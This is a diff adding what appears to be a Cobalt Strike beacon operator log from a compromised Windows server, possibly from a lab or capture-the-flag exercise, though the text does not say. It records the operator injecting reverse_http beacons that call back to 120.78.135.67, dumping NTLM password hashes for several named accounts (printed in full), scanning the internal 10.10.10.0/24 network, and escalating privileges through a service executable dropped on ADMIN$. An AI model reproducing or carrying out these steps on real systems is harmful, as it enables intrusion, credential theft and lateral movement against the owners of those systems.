@@ -1,0 +1,85 @@
+12/07 14:09:48 UTC [metadata] 36.152.17.3 <- 10.10.10.10; computer: WIN-IFPVISPB8CQ; user: Administrator *; process: z.exe; pid: 6280; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+12/07 14:09:57 UTC [input] <neo> dir
+12/07 14:09:57 UTC [error] Unknown command: dir
+12/07 14:09:59 UTC [input] <neo> ls
+12/07 14:09:59 UTC [task] <> Tasked beacon to list files in .
+12/07 14:10:30 UTC [task] <> Tasked beacon to list processes (from Process Browser)
+12/07 14:10:37 UTC [task] <> Tasked beacon to list processes (from Process Browser)
+12/07 14:10:41 UTC [checkin] host called home, sent: 43 bytes
+12/07 14:10:42 UTC [output]
+C:\\*
+D	0	12/07/2023 12:24:37	$Recycle.Bin
+F	427680	08/22/2013 13:31:45	bootmgr
+F	1	06/18/2013 20:18:29	BOOTNXT
+D	0	08/22/2013 22:48:41	Documents and Settings
+F	10769408	12/04/2023 16:05:42	frpc.exe
+F	177	12/07/2023 22:00:27	frpc.ini
+F	1342177280	12/07/2023 12:03:54	pagefile.sys
+D	0	08/22/2013 23:52:33	PerfLogs
+D	0	12/06/2023 10:03:36	phpstudy_pro
+D	0	01/25/2019 16:06:05	Program Files
+D	0	08/22/2013 23:39:32	Program Files (x86)
+D	0	01/25/2019 15:29:39	ProgramData
+D	0	01/25/2019 14:40:05	Recovery
+D	0	01/25/2019 14:38:25	System Volume Information
+D	0	12/07/2023 12:24:34	Users
+D	0	12/07/2023 22:07:46	Windows
+F	19456	12/07/2023 22:13:35	z.exe
+
+
+12/07 14:12:36 UTC [input] <neo> inject 760 x64
+12/07 14:12:40 UTC [task] <T1055> Tasked beacon to inject windows/beacon_http/reverse_http (120.78.135.67:80) into 760 (x64)
+12/07 14:12:42 UTC [checkin] host called home, sent: 277008 bytes
+12/07 14:12:42 UTC [error] could not open process 760: 5 - ERROR_ACCESS_DENIED
+12/07 14:13:08 UTC [input] <neo> inject 1480 x64
+12/07 14:13:11 UTC [task] <T1055> Tasked beacon to inject windows/beacon_http/reverse_http (120.78.135.67:80) into 1480 (x64)
+12/07 14:13:42 UTC [checkin] host called home, sent: 277008 bytes
+12/07 14:13:42 UTC [error] could not open process 1480: 5 - ERROR_ACCESS_DENIED
+12/07 14:17:21 UTC [input] <neo> hashdump
+12/07 14:17:22 UTC [task] <T1003, T1055, T1093> Tasked beacon to dump hashes
+12/07 14:17:43 UTC [checkin] host called home, sent: 82541 bytes
+12/07 14:17:44 UTC [output]
+received password hashes:
+admin:1008:aad3b435b51404eeaad3b435b51404ee:53cf234094b1e534b9d4d5754273fc51:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:09bc9520113a41a0dc8c1234b1231300:::
+best:1004:aad3b435b51404eeaad3b435b51404ee:6fdaa9c57e0bc3b3bf4bb7d5dbb32a01:::
+chu0:1013:aad3b435b51404eeaad3b435b51404ee:53cf234094b1e534b9d4d5754273fc51:::
+f12:1026:aad3b435b51404eeaad3b435b51404ee:58cfb0f02f1c9de61dc908e4ae49ee55:::
+ForestWolf:1017:aad3b435b51404eeaad3b435b51404ee:3593d341679cb1cd42d5ee96d317987d:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+hacker:1025:aad3b435b51404eeaad3b435b51404ee:58cfb0f02f1c9de61dc908e4ae49ee55:::
+jibing:1023:aad3b435b51404eeaad3b435b51404ee:134caaba92503741e58b731e7ba50497:::
+
+
+12/07 14:19:45 UTC [checkin] host called home, sent: 1734 bytes
+12/07 14:19:45 UTC [input] <neo> portscan 10.10.10.0-10.10.10.255 1-1024,3389,5000-6000 arp 1024
+12/07 14:19:45 UTC [task] <T1046, T1093> Tasked beacon to scan ports 1-1024,3389,5000-6000 on 10.10.10.0-10.10.10.255
+12/07 14:20:45 UTC [checkin] host called home, sent: 93797 bytes
+12/07 14:21:46 UTC [output]
+received output:
+(ARP) Target '10.10.10.10' is alive. 0A-D9-11-D7-E0-B1
+(ARP) Target '10.10.10.20' is alive. AA-D0-E4-D4-B1-D1
+
+
+12/07 14:22:46 UTC [output]
+received output:
+10.10.10.20:80
+10.10.10.10:5985
+10.10.10.20:22 (SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9)
+10.10.10.10:3389
+10.10.10.10:139
+10.10.10.10:135
+10.10.10.10:80
+10.10.10.10:445 (platform: 500 version: 6.3 name: WIN-IFPVISPB8CQ domain: WORKGROUP)
+Scanner module is complete
+
+
+12/07 14:23:40 UTC [input] <neo> elevate svc-exe zhany
+12/07 14:23:40 UTC [task] <T1035, T1050> Tasked beacon to run windows/foreign/reverse_http (120.78.135.67:7779) via Service Control Manager (\\127.0.0.1\ADMIN$\96bbf6f.exe)
+12/07 14:23:40 UTC [indicator] service: \\. 96bbf6f
+12/07 14:23:40 UTC [indicator] file: ef75cd8a4bc326a61e6474014113cacb 296960 bytes \\127.0.0.1\ADMIN$\96bbf6f.exe
+12/07 14:23:47 UTC [checkin] host called home, sent: 299266 bytes
+12/07 14:23:49 UTC [output]
+received output:
+Started service 96bbf6f on .
+
